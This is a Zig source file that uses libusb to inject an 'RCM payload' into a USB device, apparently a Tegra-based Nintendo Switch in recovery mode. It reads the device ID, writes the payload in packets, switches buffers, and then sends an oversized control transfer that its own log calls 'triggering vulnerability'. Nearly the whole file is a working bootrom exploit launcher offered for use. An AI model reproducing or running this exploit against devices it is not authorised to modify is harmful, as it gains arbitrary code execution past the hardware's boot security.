const std = @import("std");
const c = @cImport({
    @cInclude("libusb.h");
});

const log = std.log.scoped(.nx_device);

pub const Error = error{
    FailedToInit,
    FailedToOpenDevice,
    FailedToConfigure,
    FailedToClaimInterface,
    FailedToReadDeviceId,
    FailedToWrite,
    FailedToLaunchExploit,
};

const vendor_id = 0x0955;
const product_id = 0x7321;
const usb_interface = 0;
const device_id_len = 16;
const packet_size = 0x1000;
const default_timeout_ms = 1000;
const control_transfer_len = 0x7000;

const Self = @This();

usb_ctx: *c.libusb_context,
usb_handle: *c.libusb_device_handle,

pub fn open() Error!Self {
    var usb_ctx: ?*c.libusb_context = null;

    if (c.libusb_init(&usb_ctx) != c.LIBUSB_SUCCESS) {
        return Error.FailedToInit;
    }
    errdefer c.libusb_exit(usb_ctx.?);

    const usb_handle = c.libusb_open_device_with_vid_pid(
        usb_ctx.?,
        vendor_id,
        product_id,
    );

    if (usb_handle) |handle| {
        errdefer c.libusb_close(handle);

        if (c.libusb_set_configuration(handle, 1) != c.LIBUSB_SUCCESS) {
            return Error.FailedToConfigure;
        }

        if (c.libusb_claim_interface(handle, usb_interface) != c.LIBUSB_SUCCESS) {
            return Error.FailedToClaimInterface;
        }

        return Self{
            .usb_ctx = usb_ctx.?,
            .usb_handle = handle,
        };
    } else {
        return Error.FailedToOpenDevice;
    }
}

pub fn close(self: *const Self) void {
    if (c.libusb_release_interface(self.usb_handle, usb_interface) != c.LIBUSB_SUCCESS) {
        log.warn("failed to release usb interface", .{});
    }
    c.libusb_close(self.usb_handle);

    c.libusb_exit(self.usb_ctx);
}

fn readNxDeviceId(self: *const Self, buf: []u8) !void {
    var bytes_transferred: c_int = 0;
    const endpoint: u8 = c.LIBUSB_ENDPOINT_IN | 1;

    const res = c.libusb_bulk_transfer(
        self.usb_handle,
        endpoint,
        buf.ptr,
        @intCast(buf.len),
        &bytes_transferred,
        @intCast(default_timeout_ms),
    );

    if (res != c.LIBUSB_SUCCESS or bytes_transferred != buf.len) {
        return Error.FailedToReadDeviceId;
    }
}

fn writePayloadInPackets(self: *const Self, buf: []const u8) !usize {
    const endpoint: u8 = c.LIBUSB_ENDPOINT_OUT | 1;
    var total_bytes_sent: usize = 0;
    var packets_sent: u8 = 0;

    while (total_bytes_sent < buf.len) : (packets_sent += 1) {
        const bytes_to_send = @min(buf.len - total_bytes_sent, packet_size);
        var bytes_sent: c_int = 0;

        const result = c.libusb_bulk_transfer(
            self.usb_handle,
            endpoint,
            @constCast(&buf[total_bytes_sent]),
            @intCast(bytes_to_send),
            &bytes_sent,
            @intCast(default_timeout_ms),
        );

        if (result != c.LIBUSB_SUCCESS) {
            return Error.FailedToWrite;
        }

        total_bytes_sent += @intCast(bytes_sent);
    }

    // Switch to high buffer if the number of packets sent is even.
    if (packets_sent & 1 == 0) {
        log.debug("switching to high buffer", .{});

        var switch_buf: [packet_size]u8 = undefined;
        @memset(switch_buf[0..], 0);

        total_bytes_sent += try self.writePayloadInPackets(switch_buf[0..]);
    }

    return total_bytes_sent;
}

pub fn inject(
    self: *const Self,
    allocator: std.mem.Allocator,
    rcm_payload: []const u8,
) !void {
    var dev_id_buf: [device_id_len]u8 = undefined;
    try self.readNxDeviceId(&dev_id_buf);
    log.info("read device id: {s}", .{std.fmt.bytesToHex(dev_id_buf, .lower)});

    const total_bytes_sent = try self.writePayloadInPackets(rcm_payload);
    log.debug("sent {} bytes", .{total_bytes_sent});
    log.info("wrote the rcm payload. triggering vulnerability...", .{});

    const buf = try allocator.alloc(u8, control_transfer_len);
    defer allocator.free(buf);
    @memset(buf, 0);

    const bm_req_type: u8 = c.LIBUSB_ENDPOINT_IN | c.LIBUSB_REQUEST_TYPE_STANDARD | c.LIBUSB_RECIPIENT_INTERFACE;
    const result = c.libusb_control_transfer(
        self.usb_handle,
        bm_req_type,
        0x00,
        0x00,
        0x00,
        buf.ptr,
        control_transfer_len,
        default_timeout_ms,
    );

    if (result >= 0) {
        return Error.FailedToLaunchExploit;
    }
}
